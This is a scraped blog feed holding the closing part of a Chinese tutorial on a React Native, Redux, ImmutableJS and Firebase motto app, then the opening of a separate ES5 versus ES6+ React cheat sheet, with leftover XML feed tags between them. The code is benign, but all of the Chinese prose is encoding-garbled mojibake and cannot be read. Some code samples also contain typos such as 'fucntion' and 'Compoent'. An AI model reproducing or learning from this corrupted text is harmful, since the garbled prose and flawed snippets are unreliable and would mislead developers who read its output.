ä»¥ä¸‹æ˜¯ src/actions/index.jsï¼Œç”¨ä¾†åŒ¯å‡ºæˆ‘å€‘çš„ actionsï¼š
export * from &#x27;./uiActions&#x27;;export * from &#x27;./mottoActions&#x27;;

è¨­å®šå®Œæˆ‘å€‘çš„ actions å¾Œæˆ‘å€‘ä¾†è¨­å®š reducersï¼Œåœ¨é€™é‚Šæˆ‘å€‘åŒæ¨£ä½¿ç”¨ redux-actions æ•´åˆ ImmutableJSï¼Œ
import &#123; handleActions &#125; from &#x27;redux-actions&#x27;;// å¼•å…¥ initialState import &#123;   MottoState&#125; from &#x27;../../constants/models&#x27;;import &#123;  GET_MOTTOS,  CREATE_MOTTO,  SET_IN_MOTTO,&#125; from &#x27;../../constants/actionTypes&#x27;;// é€é set å’Œ seIn å¯ä»¥ç”¢ç”Ÿ newStateconst mottoReducers = handleActions(&#123;  GET_MOTTOS: (state, &#123; payload &#125;) =&gt; (    state.set(      &#x27;mottos&#x27;,      payload.mottos    )  ),    CREATE_MOTTO: (state) =&gt; (    state.set(      &#x27;mottos&#x27;,      state.get(&#x27;mottos&#x27;).push(state.get(&#x27;motto&#x27;))    )  ),  SET_IN_MOTTO: (state, &#123; payload &#125;) =&gt; (    state.setIn(      payload.path,      payload.value    )  )&#125;, MottoState);export default mottoReducers;

ä»¥ä¸‹æ˜¯ src/reducers/uiState.jsï¼š
import &#123; handleActions &#125; from &#x27;redux-actions&#x27;;import &#123;   UiState,&#125; from &#x27;../../constants/models&#x27;;import &#123;  TOGGLE_MODAL,&#125; from &#x27;../../constants/actionTypes&#x27;;// modal çš„é¡¯ç¤ºèˆ‡å¦const uiReducers = handleActions(&#123;  TOGGLE_MODAL: (state) =&gt; (    state.set(      &#x27;isModalVisible&#x27;,      !state.get(&#x27;isModalVisible&#x27;)    )  ),  &#125;, UiState);export default uiReducers;

ä»¥ä¸‹æ˜¯ src/reducers/index.jsï¼Œå°‡æ‰€æœ‰ reducers combine åœ¨ä¸€èµ·ï¼š
import &#123; combineReducers &#125; from &#x27;redux-immutable&#x27;;import ui from &#x27;./ui/uiReducers&#x27;;import motto from &#x27;./data/mottoReducers&#x27;;const rootReducer = combineReducers(&#123;  ui,  motto,&#125;);export default rootReducer;

é€é src/store/configureStore.jså°‡ reducers å’Œ initialState ä»¥åŠè¦ä½¿ç”¨çš„ middleware æ•´åˆæˆ storeï¼š
import &#123; createStore, applyMiddleware &#125; from &#x27;redux&#x27;;import createLogger from &#x27;redux-logger&#x27;;import Immutable from &#x27;immutable&#x27;;import rootReducer from &#x27;../reducers&#x27;;const initialState = Immutable.Map();export default createStore(  rootReducer,  initialState,  applyMiddleware(createLogger(&#123; stateTransformer: state =&gt; state.toJS() &#125;)));

è¨­å®šå®Œè³‡æ–™å±¤çš„æ¶æ§‹å¾Œï¼Œæˆ‘å€‘åˆé‡æ–°å›åˆ° View çš„éƒ¨ä»½ï¼Œæˆ‘å€‘é–‹å§‹ä¾åºè¨­å®šæˆ‘å€‘çš„ Component å’Œ Containerã€‚é¦–å…ˆï¼Œæˆ‘å€‘å…ˆè¨­è¨ˆæˆ‘å€‘çš„æ¨™é¡Œåˆ— ToolBarï¼Œä»¥ä¸‹æ˜¯ src/components/ToolBar/ToolBar.jsï¼š
import React from &#x27;react&#x27;;import ReactNative from &#x27;react-native&#x27;;import styles from &#x27;./toolBarStyles&#x27;;const &#123; View, Text &#125; = ReactNative;const ToolBar = () =&gt; (  &lt;View style=&#123;styles.toolBarContainer&#125;&gt;    &lt;Text style=&#123;styles.toolBarText&#125;&gt;Startup Mottos&lt;/Text&gt;  &lt;/View&gt;);export default ToolBar; 

ä»¥ä¸‹æ˜¯ src/components/ToolBar/toolBarStyles.jsï¼Œå°‡åº•è‰²è¨­å®šç‚ºé»ƒè‰²ï¼Œæ–‡å­—ç½®ä¸­ï¼š
import &#123; StyleSheet &#125; from &#x27;react-native&#x27;;export default StyleSheet.create(&#123;  toolBarContainer: &#123;    height: 40,    justifyContent: &#x27;center&#x27;,    alignItems: &#x27;center&#x27;,    flexDirection: &#x27;column&#x27;,    backgroundColor: &#x27;#ffeb3b&#x27;,  &#125;,  toolBarText: &#123;    fontSize: 20,    color: &#x27;#212121&#x27;  &#125;&#125;);

ä»¥ä¸‹æ˜¯ src/components/MottoList/MottoList.jsï¼Œé€™å€‹ Component ä¸­ç¨å¾®è¤‡é›œä¸€äº›ï¼Œä¸»è¦æ˜¯ä½¿ç”¨åˆ°äº† React Native ä¸­çš„ ListView Component å°‡è³‡æ–™é™£åˆ—å‚³é€² dataSourceï¼Œé€é renderRow æŠŠä¸€å€‹å€‹ row çµ¦ render å‡ºä¾†ï¼Œéç¨‹ä¸­æˆ‘å€‘é€é !Immutable.is(r1.get(&#39;id&#39;), r2.get(&#39;id&#39;)) å»åˆ¤æ–·æ•´å€‹ ListView ç•«é¢æ˜¯å¦éœ€è¦ loading æ–°çš„ item é€²ä¾†ï¼Œé€™æ¨£å°±å¯ä»¥æé«˜æ•´å€‹ ListView çš„æ•ˆèƒ½ã€‚
import React, &#123; Component &#125; from &#x27;react&#x27;;import ReactNative from &#x27;react-native&#x27;;import Immutable from &#x27;immutable&#x27;;import ListItem from &#x27;../ListItem&#x27;;import styles from &#x27;./mottoStyles&#x27;;const &#123; View, Text, ListView &#125; = ReactNative;class MottoList extends Component &#123;  constructor(props) &#123;    super(props);    this.renderListItem = this.renderListItem.bind(this);    this.listenForItems = this.listenForItems.bind(this);    this.ds = new ListView.DataSource(&#123;      rowHasChanged: (r1, r2) =&gt; !Immutable.is(r1.get(&#x27;id&#x27;), r2.get(&#x27;id&#x27;)),    &#125;)  &#125;  renderListItem(item) &#123;    return (      &lt;ListItem item=&#123;item&#125; onDeleteMotto=&#123;this.props.onDeleteMotto&#125; itemsRef=&#123;this.props.itemsRef&#125; /&gt;    );  &#125;    listenForItems(itemsRef) &#123;    itemsRef.on(&#x27;value&#x27;, (snap) =&gt; &#123;      if(snap.val() === null) &#123;        this.props.onGetMottos(Immutable.fromJS([]));      &#125; else &#123;        this.props.onGetMottos(Immutable.fromJS(snap.val()));        &#125;         &#125;);  &#125;  componentDidMount() &#123;    this.listenForItems(this.props.itemsRef);  &#125;  render() &#123;    return (      &lt;View&gt;        &lt;ListView          style=&#123;styles.listView&#125;          dataSource=&#123;this.ds.cloneWithRows(this.props.mottos.toArray())&#125;          renderRow=&#123;this.renderListItem&#125;          enableEmptySections=&#123;true&#125;        /&gt;      &lt;/View&gt;    );  &#125;&#125;export default MottoList;

ä»¥ä¸‹æ˜¯ src/components/MottoList/mottoListStyles.jsï¼Œæˆ‘å€‘ä½¿ç”¨åˆ°äº† Dimensionsï¼Œå¯ä»¥æ ¹æ“šè¢å¹•çš„é«˜åº¦ä¾†è¨­å®šæ•´å€‹ ListView é«˜åº¦ï¼š
import &#123; StyleSheet, Dimensions &#125; from &#x27;react-native&#x27;;const &#123; height &#125; = Dimensions.get(&#x27;window&#x27;);export default StyleSheet.create(&#123;  listView: &#123;    flex: 1,    flexDirection: &#x27;column&#x27;,    height: height - 105,  &#125;,&#125;);

ä»¥ä¸‹æ˜¯ src/components/ListItem/ListItem.jsï¼Œæˆ‘å€‘å¾ props æ”¶åˆ°äº†ä¸Šå±¤å‚³é€²ä¾†çš„ motto itemï¼Œé¡¯ç¤ºå‡º motto æ–‡å­—å…§å®¹ã€‚ç•¶æˆ‘å€‘é»æ“Š &lt;TouchableHighlight&gt; æ™‚å°±æœƒåˆªé™¤è©² mottoã€‚
import React from &#x27;react&#x27;;import ReactNative from &#x27;react-native&#x27;;import styles from &#x27;./listItemStyles&#x27;;const &#123; View, Text, TouchableHighlight &#125; = ReactNative;const ListItem = (props) =&gt; &#123;  return (    &lt;View style=&#123;styles.listItemContainer&#125;&gt;      &lt;Text style=&#123;styles.listItemText&#125;&gt;&#123;props.item.get(&#x27;text&#x27;)&#125;&lt;/Text&gt;      &lt;TouchableHighlight onPress=&#123;props.onDeleteMotto(props.item.get(&#x27;id&#x27;), props.itemsRef)&#125;&gt;        &lt;Text&gt;Delete&lt;/Text&gt;      &lt;/TouchableHighlight&gt;    &lt;/View&gt;  )&#125;;export default ListItem;

ä»¥ä¸‹æ˜¯ src/components/ListItem/listItemStyles.jsï¼š
import &#123; StyleSheet &#125; from &#x27;react-native&#x27;;export default StyleSheet.create(&#123;  listItemContainer: &#123;    flex: 1,    flexDirection: &#x27;row&#x27;,    padding: 10,    margin: 5,  &#125;,  listItemText: &#123;    flex: 10,    fontSize: 18,    color: &#x27;#212121&#x27;,  &#125;&#125;);

ä»¥ä¸‹æ˜¯ src/components/ActionButton/ActionButton.jsï¼Œç•¶é»æ“Šäº†æŒ‰éˆ•å‰‡æœƒè§¸ç™¼ onToggleModal æ–¹æ³•ï¼Œå‡ºç¾æ–°å¢ motto çš„ modalï¼š
import React from &#x27;react&#x27;;import ReactNative from &#x27;react-native&#x27;;import styles from &#x27;./actionButtonStyles&#x27;;const &#123; View, Text, Modal, TextInput, TouchableHighlight &#125; = ReactNative;  const ActionButton = (props) =&gt; (  &lt;TouchableHighlight onPress=&#123;props.onToggleModal&#125;&gt;    &lt;View style=&#123;styles.buttonContainer&#125;&gt;        &lt;Text style=&#123;styles.buttonText&#125;&gt;Add Motto&lt;/Text&gt;    &lt;/View&gt;  &lt;/TouchableHighlight&gt;);export default ActionButton;

ä»¥ä¸‹æ˜¯ src/components/ActionButton/actionButtonStyles.jsï¼š
import &#123; StyleSheet &#125; from &#x27;react-native&#x27;;export default StyleSheet.create(&#123;  buttonContainer: &#123;    height: 40,    justifyContent: &#x27;center&#x27;,    alignItems: &#x27;center&#x27;,    flexDirection: &#x27;column&#x27;,    backgroundColor: &#x27;#66bb6a&#x27;,  &#125;,  buttonText: &#123;    fontSize: 20,    color: &#x27;#e8f5e9&#x27;  &#125;&#125;);

ä»¥ä¸‹æ˜¯ src/components/InputModal/InputModal.jsï¼Œå…¶ä¸»è¦è² è²¬ Modal Component çš„è¨­è¨ˆï¼Œç•¶è¼¸å…¥å…§å®¹æœƒè§¸ç™¼ onChangeMottoText ç™¼å‡º actionï¼Œæ³¨æ„çš„æ˜¯ç•¶æŒ‰ä¸‹é€å‡ºéµï¼ŒåŒæ™‚æœƒæŠŠ Firebase çš„åƒè€ƒ itemsRef é€å…¥ onCreateMotto ä¸­ï¼Œæ–¹ä¾¿é€é API å»å³æ™‚æ–°å¢åˆ° Firebase Databaseï¼Œä¸¦æ›´æ–° client state å’Œé‡æ–°æ¸²æŸ“äº† Viewï¼š
import React from &#x27;react&#x27;;import ReactNative from &#x27;react-native&#x27;;import styles from &#x27;./inputModelStyles&#x27;;const &#123; View, Text, Modal, TextInput, TouchableHighlight &#125; = ReactNative;const InputModal = (props) =&gt; (  &lt;View&gt;    &lt;Modal      animationType=&#123;&quot;slide&quot;&#125;      transparent=&#123;false&#125;      visible=&#123;props.isModalVisible&#125;      onRequestClose=&#123;props.onToggleModal&#125;      &gt;     &lt;View&gt;      &lt;View&gt;        &lt;Text style=&#123;styles.modalHeader&#125;&gt;Please Keyin your Motto!&lt;/Text&gt;        &lt;TextInput          onChangeText=&#123;props.onChangeMottoText&#125;        /&gt;        &lt;View style=&#123;styles.buttonContainer&#125;&gt;                &lt;TouchableHighlight             onPress=&#123;props.onToggleModal&#125;            style=&#123;[styles.cancelButton]&#125;          &gt;            &lt;Text              style=&#123;styles.buttonText&#125;            &gt;              Cancel            &lt;/Text&gt;          &lt;/TouchableHighlight&gt;          &lt;TouchableHighlight             onPress=&#123;props.onCreateMotto(props.itemsRef)&#125;            style=&#123;[styles.submitButton]&#125;          &gt;            &lt;Text              style=&#123;styles.buttonText&#125;            &gt;              Submit            &lt;/Text&gt;          &lt;/TouchableHighlight&gt;          &lt;/View&gt;      &lt;/View&gt;     &lt;/View&gt;    &lt;/Modal&gt;  &lt;/View&gt;);export default InputModal;

ä»¥ä¸‹æ˜¯ src/components/InputModal/inputModalStyles.jsï¼š
import &#123; StyleSheet &#125; from &#x27;react-native&#x27;;export default StyleSheet.create(&#123;  modalHeader: &#123;    flex: 1,    height: 30,    padding: 10,    flexDirection: &#x27;row&#x27;,    backgroundColor: &#x27;#ffc107&#x27;,    fontSize: 20,  &#125;,  buttonContainer: &#123;    flex: 1,    flexDirection: &#x27;row&#x27;,  &#125;,  button: &#123;    borderRadius: 5,  &#125;,  cancelButton: &#123;    flex: 1,    height: 40,    alignItems: &#x27;center&#x27;,    justifyContent: &#x27;center&#x27;,    backgroundColor: &#x27;#eceff1&#x27;,    margin: 5,  &#125;,  submitButton: &#123;    flex: 1,    height: 40,    alignItems: &#x27;center&#x27;,    justifyContent: &#x27;center&#x27;,    backgroundColor: &#x27;#4fc3f7&#x27;,    margin: 5,  &#125;,  buttonText: &#123;    fontSize: 20,  &#125;&#125;);

è¨­å®šå®Œäº† Componentï¼Œæˆ‘å€‘ä¾†æ¢è¨ä¸€ä¸‹ Container çš„éƒ¨ä»½ã€‚ä»¥ä¸‹æ˜¯ src/containers/ActionButtonContainer/ActionButtonContainer.jsï¼š
import &#123; connect &#125; from &#x27;react-redux&#x27;;import ActionButton from &#x27;../../components/ActionButton&#x27;;import &#123;  toggleModal,&#125; from &#x27;../../actions&#x27;; export default connect(  (state) =&gt; (&#123;&#125;),  (dispatch) =&gt; (&#123;    onToggleModal: () =&gt; (      dispatch(toggleModal())    )  &#125;))(ActionButton);

ä»¥ä¸‹æ˜¯ src/containers/InputModalContainer/InputModalContainer.jsï¼š
import &#123; connect &#125; from &#x27;react-redux&#x27;;import InputModal from &#x27;../../components/InputModal&#x27;;import Immutable from &#x27;immutable&#x27;;import &#123;  toggleModal,  setInMotto,  createMotto,&#125; from &#x27;../../actions&#x27;;import uuid from &#x27;uuid&#x27;; export default connect(  (state) =&gt; (&#123;    isModalVisible: state.getIn([&#x27;ui&#x27;, &#x27;isModalVisible&#x27;]),    motto: state.getIn([&#x27;motto&#x27;, &#x27;motto&#x27;]),  &#125;),  (dispatch) =&gt; (&#123;    onToggleModal: () =&gt; (      dispatch(toggleModal())    ),    onChangeMottoText: (text) =&gt; (      dispatch(setInMotto(&#123; path: [&#x27;motto&#x27;, &#x27;text&#x27;], value: text &#125;))    ),    // æ–°å¢ motto æ˜¯é€é itemsRef å°‡æ–°å¢çš„ motto push é€²å»ï¼Œæ–°å¢å¾Œè¦æŠŠæœ¬åœ°ç«¯çš„ motto æ¸…ç©ºï¼Œä¸¦é—œé–‰ modalï¼š    onCreateMotto: (motto) =&gt; (itemsRef) =&gt; () =&gt; &#123;      itemsRef.push(&#123; id: uuid.v4(), text: motto.get(&#x27;text&#x27;), updatedAt: Date.now() &#125;);      dispatch(setInMotto(&#123; path: [&#x27;motto&#x27;], value: Immutable.fromJS(&#123; id: &#x27;&#x27;, text: &#x27;&#x27;, updatedAt: &#x27;&#x27; &#125;)&#125;));      dispatch(toggleModal());    &#125;  &#125;),  (stateToProps, dispatchToProps, ownProps) =&gt; &#123;    const &#123; motto &#125; = stateToProps;    const &#123; onCreateMotto &#125; = dispatchToProps;    return Object.assign(&#123;&#125;, stateToProps, dispatchToProps, ownProps, &#123;      onCreateMotto: onCreateMotto(motto),    &#125;);  &#125;,)(InputModal);

ä»¥ä¸‹æ˜¯ src/containers/MottoListContainer/MottoListContainer.jsï¼š
import &#123; connect &#125; from &#x27;react-redux&#x27;;import MottoList from &#x27;../../components/MottoList&#x27;;import Immutable from &#x27;immutable&#x27;;import uuid from &#x27;uuid&#x27;;import &#123;  createMotto,  getMottos,  changeMottoTitle,&#125; from &#x27;../../actions&#x27;;export default connect(  (state) =&gt; (&#123;    mottos: state.getIn([&#x27;motto&#x27;, &#x27;mottos&#x27;]),  &#125;),  (dispatch) =&gt; (&#123;    onCreateMotto: () =&gt; (      dispatch(createMotto())    ),    onGetMottos: (mottos) =&gt; (      dispatch(getMottos(&#123; mottos &#125;))    ),    onChangeMottoTitle: (title) =&gt; (      dispatch(changeMottoTitle(&#123; value: title &#125;))    ),    // åˆ¤æ–·é»æ“Šçš„æ˜¯å“ªä¸€å€‹ item å–å‡ºå…¶ keyï¼Œé€é itemsRef å°‡å…¶ç§»é™¤    onDeleteMotto: (mottos) =&gt; (id, itemsRef) =&gt; () =&gt; &#123;      mottos.forEach((value, key) =&gt; &#123;        if(value.get(&#x27;id&#x27;) === id) &#123;          itemsRef.child(key).remove();        &#125;      &#125;);    &#125;  &#125;),  (stateToProps, dispatchToProps, ownProps) =&gt; &#123;    const &#123; mottos &#125; = stateToProps;    const &#123; onDeleteMotto &#125; = dispatchToProps;    return Object.assign(&#123;&#125;, stateToProps, dispatchToProps, ownProps, &#123;      onDeleteMotto: onDeleteMotto(mottos),    &#125;);  &#125;)(MottoList);

æœ€å¾Œæˆ‘å€‘å¯ä»¥é€éå•Ÿå‹•æ¨¡æ“¬å™¨å¾Œä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤é–‹å•Ÿæˆ‘å€‘ Appï¼
$ react-native run-android

æœ€å¾Œçš„æˆæœï¼š

åŒæ™‚ä½ å¯ä»¥åœ¨ Firebase å¾Œå°é€²è¡Œè§€å¯Ÿï¼Œç•¶å‘¼å« Firebase API é€²è¡Œè³‡æ–™æ›´å‹•æ™‚ï¼ŒFirebase Realtime Database å°±æœƒå³æ™‚æ›´æ–°ï¼š

ç¸½çµæ­å–œä½ ï¼ä½ å·²ç¶“å®Œæˆäº†ä½ çš„ç¬¬ä¸€å€‹ React Native Appï¼Œè‹¥ä½ å¸Œæœ›å°‡ä½ é–‹ç™¼çš„æ‡‰ç”¨ç¨‹å¼ç°½ç« å¾Œä¸Šæ¶ï¼Œè«‹åƒè€ƒå®˜æ–¹çš„èªªæ˜æ–‡ä»¶ï¼Œç•¶ä½ å®Œæˆç°½ç« æ‰“åŒ…ç­‰æµç¨‹å¾Œï¼Œæˆ‘å€‘å¯ä»¥ç²å¾— .apk æª”ï¼Œé€™æ™‚å°±å¯ä»¥ä¸Šæ¶åˆ°å¸‚é›†è®“éš”å£ç­å¿ƒå„€çš„å¥³ç”Ÿï¼Œå•Šä¸æ˜¯ï¼Œæ˜¯å»£å¤§çš„ Android ä½¿ç”¨è€…ä½¿ç”¨ä½ çš„ App å•¦ï¼ç•¶ç„¶ï¼Œç”±æ–¼æˆ‘å€‘çš„ç¨‹å¼ç¢¼å¯ä»¥ 100% å…±ç”¨æ–¼ iOS å’Œ Android ç«¯ï¼Œæ‰€ä»¥ä½ ä¹Ÿå¯ä»¥åŒæ­¥ä¸Šæ¶åˆ° Apple Storeï¼å®Œæ•´ç¨‹å¼ç¢¼è«‹åƒè€ƒé€™è£¡ã€‚åŸæ–‡é€£è¼‰æ–¼ å¾é›¶é–‹å§‹å­¸ ReactJSã€‚
å»¶ä¼¸é–±è®€
React Native å®˜æ–¹ç¶²ç«™
React å®˜æ–¹ç¶²ç«™
Redux å®˜æ–¹æ–‡ä»¶
Ionic Framework vs React Native
How to Build a Todo App Using React, Redux, and Immutable.js
Your First Immutable React &amp; Redux App
React, Redux and Immutable.js: Ingredients for Efficient Web Applications
Full-Stack Redux Tutorial
reduxä¸immutableå®ä¾‹
gajus&#x2F;redux-immutable
acdlite&#x2F;redux-actions
Flux Standard Action
React Native ImmutableJS ListView Example
React Native 0.23.1 warning: â€˜In next release empty section headers will be renderedâ€™
js.coach
React Native Package Manager
React Native å­¦ä¹ ç¬”è®°
The beginners guide to React Native and Firebase
Authentication in React Native with Firebase
bruz&#x2F;react-native-redux-groceries
Building a Simple ToDo App With React Native and Firebase
Firebase Permission Denied
Best Practices: Arrays in Firebase
Avoiding plaintext passwords in gradle
Generating Signed APK

(image via moduscreateã€css-tricksã€teamtreehouseã€teamtreehouseã€css-tricksã€css-tricks)
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ï¼Œç›®å‰å°ˆæ³¨åœ¨ Mobile å’Œ IoT æ‡‰ç”¨é–‹ç™¼ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>React, React Native, ES5, ES6, ES7, JavaScript, iOS, Android, ECMAScript2015, Webpack, JSX, Firebase</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸€çœ‹å°±æ‡‚çš„ React ES5ã€ES6+ å¸¸è¦‹ç”¨æ³•å°ç…§è¡¨</title>
    <url>/2016/04/04/react-react-native-es5-es6-cheat-sheet/</url>
    <content><![CDATA[
å‰è¨€React æ˜¯ Facebook æ¨å‡ºçš„é–‹æº JavaScript Libraryã€‚è‡ªå¾ React æ­£å¼é–‹æºå¾Œï¼ŒReact ç”Ÿæ…‹ç³»é–‹å§‹è“¬å‹ƒç™¼å±•ã€‚äº‹å¯¦ä¸Šï¼Œé€éå­¸ç¿’ React ç”Ÿæ…‹ç³»ï¼ˆecosystemï¼‰çš„éç¨‹ä¸­ï¼Œå¯ä»¥è®“æˆ‘å€‘é †ä¾¿å­¸ç¿’ç¾ä»£åŒ– Web é–‹ç™¼çš„é‡è¦è§€å¿µï¼ˆä¾‹å¦‚ï¼šES6ã€Webpackã€Babelã€æ¨¡çµ„åŒ–ç­‰ï¼‰ï¼Œæˆç‚ºæ›´å¥½çš„é–‹ç™¼è€…ã€‚é›–ç„¶ ES6ï¼ˆECMAScript2015ï¼‰ã€ES7 æ˜¯æœªä¾†è¶¨å‹¢ï¼ˆæœ¬æ–‡å°‡ ES6ã€ES7 ç¨±ç‚º ES6+ï¼‰ï¼Œç„¶è€Œç›®å‰åœ¨ç¶²è·¯ä¸Šæœ‰è¨±å¤šçš„å­¸ç¿’è³‡æºä»æ˜¯ä»¥ ES5 ç‚ºä¸»ï¼Œå°è‡´è®€è€…åœ¨å­¸ç¿’ä¸Šé‡åˆ°ä¸€äº›å‘æ´å’Œè¿·æƒ‘ï¼ˆæœ¬æ–‡å‡è¨­è®€è€…å°æ–¼ React å·²ç¶“æœ‰äº›åŸºæœ¬èªè­˜ï¼Œè‹¥ä½ å°æ–¼ React å°šä¸ç†Ÿæ‚‰ï¼Œå»ºè­°å…ˆè¡Œé–±è®€å®˜æ–¹æ–‡ä»¶å’Œæœ¬ç¯‡å…¥é–€æ•™å­¸ï¼‰ã€‚å› æ­¤æœ¬æ–‡å¸Œæœ›é€éæ•´ç†åœ¨ React ä¸­ ES5ã€ES6+ å¸¸è¦‹ç”¨æ³•å°ç…§è¡¨ï¼Œè®“è®€è€…å€‘å¯ä»¥åœ¨å¯¦ç¾åŠŸèƒ½æ™‚ï¼ˆå°¤å…¶åœ¨ React Nativeï¼‰å¯ä»¥æ›´æ¸…æ¥šå…©è€…çš„å·®ç•°ï¼Œç„¡ç—›è½‰ç§»åˆ° ES6+ã€‚ 
å¤§ç¶±
Modules
Classes
Method definition
Property initializers
State
Arrow functions
Dynamic property names &amp; template strings
Destructuring &amp; spread attributes
Mixins
Default Parameters

1. Moduleséš¨è‘— Web æŠ€è¡“çš„é€²å±•ï¼Œæ¨¡çµ„åŒ–é–‹ç™¼å·²ç¶“æˆç‚ºä¸€å€‹é‡è¦èª²é¡Œã€‚é—œæ–¼ JavaScript æ¨¡çµ„åŒ–æˆ‘å€‘é€™é‚Šä¸è©³è¿°ï¼Œå»ºè­°è®€è€…åƒè€ƒ é€™ä»½æŠ•å½±ç‰‡ å’Œ é€™ç¯‡æ–‡ç« ã€‚
ES5 è‹¥ä½¿ç”¨ CommonJS æ¨™æº–ï¼Œä¸€èˆ¬ä½¿ç”¨ require() ç”¨æ³•å¼•å…¥æ¨¡çµ„ï¼š
var React = require(&#x27;react&#x27;);var MyComponent = require(&#x27;./MyComponent&#x27;);

è¼¸å‡ºå‰‡æ˜¯ä½¿ç”¨ module.exportsï¼š
module.exports = MyComponent;


ES6+ import ç”¨æ³•ï¼š
import React from &#x27;react&#x27;;import MyComponent from &#x27;./MyComponent&#x27;;

è¼¸å‡ºå‰‡æ˜¯ä½¿ç”¨ export defaultï¼š
export default class MyComponent extends React.Compoent &#123;	&#125;


2. Classesåœ¨ React ä¸­å…ƒä»¶ï¼ˆComponentï¼‰æ˜¯çµ„æˆè¦–è¦ºé é¢çš„åŸºç¤ã€‚åœ¨ ES5 ä¸­æˆ‘å€‘ä½¿ç”¨ React.createClass() ä¾†å»ºç«‹ Componentï¼Œè€Œåœ¨ ES6+ å‰‡æ˜¯ç”¨ Classes ç¹¼æ‰¿ React.Component ä¾†å»ºç«‹ Componentã€‚è‹¥æ˜¯æœ‰å¯«é Java ç­‰ç‰©ä»¶å°å‘èªè¨€ï¼ˆOOPï¼‰çš„è®€è€…æ‡‰è©²å°æ–¼é€™ç¨®å¯«æ³•æ¯”è¼ƒä¸é™Œç”Ÿï¼Œä¸éè¦æ³¨æ„çš„æ˜¯ JavaScript ä»æ˜¯åŸå‹ç¹¼æ‰¿é¡å‹çš„ç‰©ä»¶å°å‘ç¨‹å¼èªè¨€ï¼Œåªæ˜¯ä½¿ç”¨ Classes è®“ç‰©ä»¶å°å‘ä½¿ç”¨ä¸Šæ›´åŠ ç›´è§€ã€‚å°æ–¼é¸æ“‡ class ä½¿ç”¨ä¸Šé‚„æœ‰ç–‘æƒ‘çš„è®€è€…å»ºè­°å¯ä»¥é–±è®€ React.createClass versus extends React.Component é€™ç¯‡æ–‡ç« ã€‚
ES5 React.createClass() ç”¨æ³•ï¼š
var Photo = React.createClass(&#123;  render: function() &#123;    return (    	&lt;div&gt;    		&lt;img alt=&#123;this.props.description&#125; src=&#123;this.props.src&#125; /&gt;    	&lt;/div&gt;    	);  &#125;&#125;);ReactDOM.render(&lt;Photo /&gt;, document.getElementById(&#x27;main&#x27;));

ES6+ class ç”¨æ³•ï¼š
class Photo extends React.Component &#123;  render() &#123;    return &lt;img alt=&#123;this.props.description&#125; src=&#123;this.props.src&#125; /&gt;;  &#125;&#125;ReactDOM.render(&lt;Photo /&gt;, document.getElementById(&#x27;main&#x27;));

åœ¨ ES5 æˆ‘å€‘æœƒåœ¨ componentWillMount  ç”Ÿå‘½é€±æœŸå®šç¾©å¸Œæœ›åœ¨ render å‰åŸ·è¡Œï¼Œä¸”åªæœƒåŸ·è¡Œä¸€æ¬¡çš„ä»»å‹™ï¼š
var Photo = React.createClass(&#123;  componentWillMount: function() &#123;&#125;&#125;);

åœ¨ ES6+ å‰‡æ˜¯å®šç¾©åœ¨ constructor  å»ºæ§‹å­ä¸­ï¼š
class Photo extends React.Component &#123;  constructor(props) &#123;    super(props);    // åŸæœ¬åœ¨ componentWillMount æ“ä½œçš„å‹•ä½œå¯ä»¥æ”¾åœ¨é€™  &#125;&#125;

3. Method definitionåœ¨ ES6 ä¸­æˆ‘å€‘ä½¿ç”¨ Method å¯ä»¥å¿½ç•¥ function å’Œ ,ï¼Œä½¿ç”¨ä¸Šæ›´ç‚ºç°¡æ½”ï¼ES5 React.createClass() ç”¨æ³•ï¼š
var Photo = React.createClass(&#123;  handleClick: function(e) &#123;&#125;,  render: function() &#123;&#125;&#125;);

ES6+ class ç”¨æ³•ï¼š
class Photo extends React.Component &#123;  handleClick(e) &#123;&#125;  render() &#123;&#125;&#125;


4. Property initializersComponent å±¬æ€§å€¼æ˜¯è³‡æ–™å‚³éé‡è¦çš„å…ƒç´ ï¼Œåœ¨ ES5 ä¸­æˆ‘å€‘ä½¿ç”¨ propTypes  å’Œ  getDefaultProps  ä¾†å®šç¾©å±¬æ€§ï¼ˆpropsï¼‰çš„é è¨­å€¼å’Œå‹åˆ¥ï¼š
var Todo = React.createClass(&#123;  getDefaultProps: function() &#123;    return &#123;      checked: false,      maxLength: 10,    &#125;;  &#125;,  propTypes: &#123;    checked: React.PropTypes.bool.isRequired,    maxLength: React.PropTypes.number.isRequired  &#125;,  render: fucntion() &#123;  	return();  &#125;&#125;);

åœ¨ ES6+ ä¸­æˆ‘å€‘å‰‡æ˜¯åƒè€ƒ ES7 property initializers ä½¿ç”¨ class ä¸­çš„éœæ…‹å±¬æ€§ï¼ˆstatic propertiesï¼‰ä¾†å®šç¾©ï¼š
class Todo extends React.Component &#123;  static defaultProps = &#123;    checked: false,    maxLength: 10,  &#125;; // æ³¨æ„æœ‰åˆ†è™Ÿ  static propTypes = &#123;    checked: React.PropTypes.bool.isRequired,    maxLength: React.PropTypes.number.isRequired  &#125;;  render() &#123;  	return();  &#125;&#125;

ES6+ å¦å¤–ä¸€ç¨®å¯«æ³•ï¼Œå¯ä»¥ç•™æ„ä¸€ä¸‹ï¼Œä¸»è¦æ˜¯çœ‹å„åœ˜éšŠå–œå¥½å’Œè¦ç¯„ï¼Œé¸æ“‡åˆé©çš„æ–¹å¼ï¼š
class Todo extends React.Component &#123;    render() &#123;        return (            &lt;View /&gt;        );    &#125;&#125;Todo.defaultProps = &#123;    checked: false,    maxLength: 10,&#125;;Todo.propTypes = &#123;    checked: React.PropTypes.bool.isRequired,    maxLength: React.PropTypes.number.isRequired,&#125;;


5. Stateåœ¨ React ä¸­ Props å’Œ State æ˜¯è³‡æ–™æµå‚³éçš„é‡è¦å…ƒç´ ï¼Œä¸åŒçš„æ˜¯ state å¯æ›´å‹•ï¼Œå¯ä»¥å»åŸ·è¡Œä¸€äº›é‹ç®—ã€‚åœ¨ ES5 ä¸­æˆ‘å€‘ä½¿ç”¨ getInitialState  å»åˆå§‹åŒ– stateï¼š 
var Todo = React.createClass(&#123;    getInitialState: function() &#123;        return &#123;            maxLength: this.props.maxLength,        &#125;;    &#125;,&#125;);

